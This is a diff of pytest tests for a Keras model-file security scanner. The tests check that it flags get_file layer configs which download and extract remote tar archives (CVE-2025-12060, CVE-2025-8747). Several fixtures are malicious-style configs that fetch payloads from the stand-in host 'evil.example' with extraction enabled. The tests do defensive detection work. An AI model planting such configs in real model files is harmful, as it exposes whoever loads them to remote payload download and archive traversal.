@@ -6876,8 +6876,8 @@ class TestCVE20258747GetFileGadget:
         assert len(cve_issues) == 1
         assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]
 
-    def test_get_file_extract_numeric_truthy_detects_cve_2025_12060(self, tmp_path: Path) -> None:
-        """Numeric truthy extract values should match Keras get_file behavior."""
+    def test_get_file_extract_tar_archive_format_detects_cve_2025_12060(self, tmp_path: Path) -> None:
+        """Explicit tar archive_format should not rely on a tar-looking URL suffix."""
         scanner = KerasZipScanner()
         config = {
             "class_name": "Sequential",
@@ -6888,8 +6888,9 @@ class TestCVE20258747GetFileGadget:
                         "name": "dense_1",
                         "config": {
                             "fn": "get_file",
-                            "url": "https://evil.example/payload.tar.gz",
-                            "extract": 1,
+                            "url": "https://evil.example/download?id=payload",
+                            "extract": True,
+                            "archive_format": "tar",
                         },
                     }
                 ]
@@ -6900,9 +6901,10 @@ class TestCVE20258747GetFileGadget:
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
         assert len(cve_issues) == 1
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]
 
-    def test_get_file_extract_string_truthy_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
-        """String truthy extract values in kwargs should be treated as extracting."""
+    def test_get_file_named_untar_detects_cve_2025_12060_without_tar_suffix(self, tmp_path: Path) -> None:
+        """Named untar=True should mark a remote get_file URL as tar extraction."""
         scanner = KerasZipScanner()
         config = {
             "class_name": "Sequential",
@@ -6912,11 +6914,9 @@ class TestCVE20258747GetFileGadget:
                         "class_name": "Dense",
                         "name": "dense_1",
                         "config": {
-                            "fn": "keras.utils.get_file",
-                            "kwargs": {
-                                "origin": "https://evil.example/payload.tar.gz",
-                                "extract": "yes",
-                            },
+                            "fn": "get_file",
+                            "url": "https://evil.example/download",
+                            "untar": True,
                         },
                     }
                 ]
@@ -6927,6 +6927,7 @@ class TestCVE20258747GetFileGadget:
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
         assert len(cve_issues) == 1
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]
 
     def test_get_file_extract_tar_url_fragment_detects_cve_2025_12060(self, tmp_path: Path) -> None:
         """URL fragments must not hide tar extraction gadgets from CVE attribution."""
@@ -6990,9 +6991,9 @@ class TestCVE20258747GetFileGadget:
         assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]
 
     def test_get_file_positional_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
-        """Positional get_file args with extract=True should receive CVE attribution."""
+        """Positional extract=True uses the tar-capable default auto format."""
         scanner = KerasZipScanner()
-        archive_url = "https://evil.example/payload.tar.zst"
+        archive_url = "https://evil.example/download"
         config = {
             "class_name": "Sequential",
             "config": {
@@ -7015,10 +7016,10 @@ class TestCVE20258747GetFileGadget:
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
         assert cve_issues[0].details["urls"] == [archive_url]
 
-    def test_get_file_positional_untar_truthy_detects_cve_2025_12060(self, tmp_path: Path) -> None:
-        """Positional untar truthy values should receive CVE attribution."""
+    def test_get_file_positional_tar_archive_format_detects_cve_2025_12060(self, tmp_path: Path) -> None:
+        """Positional archive_format='tar' should not rely on a tar-looking URL suffix."""
         scanner = KerasZipScanner()
-        archive_url = "https://evil.example/payload.tar.gz"
+        archive_url = "https://evil.example/download?id=payload"
         config = {
             "class_name": "Sequential",
             "config": {
@@ -7028,7 +7029,7 @@ class TestCVE20258747GetFileGadget:
                         "name": "dense_1",
                         "config": {
                             "fn": "keras.utils.get_file",
-                            "args": ["payload.tar.gz", archive_url, 1],
+                            "args": ["payload", archive_url, False, None, None, "datasets", "auto", True, "tar"],
                         },
                     }
                 ]
@@ -7039,36 +7040,7 @@ class TestCVE20258747GetFileGadget:
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
         assert len(cve_issues) == 1
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
-        assert cve_issues[0].details["urls"] == [archive_url]
-
-    @pytest.mark.parametrize("extract_value", [False, 0, "", None])
-    def test_get_file_false_like_extract_values_no_cve_2025_12060(
-        self,
-        tmp_path: Path,
-        extract_value: object,
-    ) -> None:
-        """False-like extract values should not trigger the archive extraction CVE."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/payload.tar.gz",
-                            "extract": extract_value,
-                        },
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
-
-        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
-        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
+        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]
 
     def test_get_file_tar_url_without_extract_true_no_cve_2025_12060(self, tmp_path: Path) -> None:
         """Tar URLs are only CVE-2025-12060 when the same get_file call extracts them."""
@@ -7094,8 +7066,33 @@ class TestCVE20258747GetFileGadget:
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
 
-    def test_get_file_extract_non_archive_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
-        """extract=True on a non-tar URL is not enough for the tar extraction CVE."""
+    def test_get_file_extract_zip_archive_format_no_cve_2025_12060(self, tmp_path: Path) -> None:
+        """Explicit zip format disables tar extraction even for a tar-looking URL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "url": "https://evil.example/payload.tar.gz",
+                            "extract": True,
+                            "archive_format": "zip",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
+
+    def test_get_file_extract_default_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
+        """Default auto format content-sniffs tar archives regardless of URL suffix."""
         scanner = KerasZipScanner()
         config = {
             "class_name": "Sequential",
@@ -7115,8 +7112,289 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert len(cve_issues) == 1
+        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.bin"]
+
+    def test_get_file_extract_explicit_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
+        """Explicit auto format also enables tar content sniffing."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "origin": "https://evil.example/download",
+                            "extract": True,
+                            "archive_format": "auto",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert len(cve_issues) == 1
+        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]
+
+    def test_get_file_extract_tar_in_format_list_detects_cve_2025_12060(self, tmp_path: Path) -> None:
+        """A valid format list may try zip first and then tar."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "origin": "https://evil.example/download",
+                            "extract": True,
+                            "archive_format": ["zip", "tar"],
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize("archive_format", ["tgz", "tar.gz", "TAR", " tar "])
+    def test_get_file_unsupported_archive_format_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        archive_format: str,
+    ) -> None:
+        """Unsupported aliases and normalized variants fail before extraction in Keras."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "origin": "https://evil.example/payload.tar.gz",
+                            "extract": True,
+                            "archive_format": archive_format,
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize("archive_format", [None, [], ["auto", "tar"]])
+    def test_get_file_non_tar_effective_format_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        archive_format: Any,
+    ) -> None:
+        """Disabled formats and a list that errors before tar cannot reach tar extraction."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "origin": "https://evil.example/payload.tar.gz",
+                            "extract": True,
+                            "archive_format": archive_format,
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize(("argument", "value"), [("extract", 1), ("extract", "yes"), ("untar", 1)])
+    def test_get_file_truthy_extraction_arguments_detect_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        argument: str,
+        value: Any,
+    ) -> None:
+        """Keras uses Python truthiness rather than requiring literal booleans."""
+        scanner = KerasZipScanner()
+        call_config: dict[str, Any] = {
+            "fn": "get_file",
+            "origin": "https://evil.example/download",
+            argument: value,
+        }
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert cve_issues
+        assert "Truthy" in cve_issues[0].details["description"]
+        assert cve_issues[0].why is not None
+        assert "truthy" in cve_issues[0].why
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": "false"},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": 1},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", "false"]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    1,
+                ],
+            },
+        ],
+    )
+    def test_get_file_truthy_extraction_argument_forms_detect_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """Truthy kwargs and positional values must match Keras extraction behavior."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {"fn": "get_file", "origin": "https://evil.example/download", "extract": False},
+            {"fn": "get_file", "origin": "https://evil.example/download", "untar": 0},
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": ""},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": None},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", []]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    {},
+                ],
+            },
+        ],
+    )
+    def test_get_file_false_like_extraction_argument_forms_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """False-like extraction values must not create archive-traversal false positives."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
+
+    def test_get_file_url_valued_kwargs_metadata_is_not_origin(self, tmp_path: Path) -> None:
+        """URL-looking kwargs outside origin/url must not be reported as the downloaded archive."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "kwargs": {
+                                "origin": "/local/model",
+                                "file_hash": "https://docs.example/not-the-origin",
+                                "extract": True,
+                                "archive_format": "tar",
+                            },
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    def test_get_file_url_valued_positional_fname_is_not_origin(self, tmp_path: Path) -> None:
+        """Only positional index 1 is the remote get_file origin."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "args": [
+                                "https://docs.example/not-the-origin",
+                                "/local/model",
+                                False,
+                                None,
+                                None,
+                                "datasets",
+                                "auto",
+                                True,
+                                "tar",
+                            ],
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
 
     def test_get_file_metadata_extract_tar_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
         """Metadata nested beside get_file should not be mistaken for get_file extraction args."""
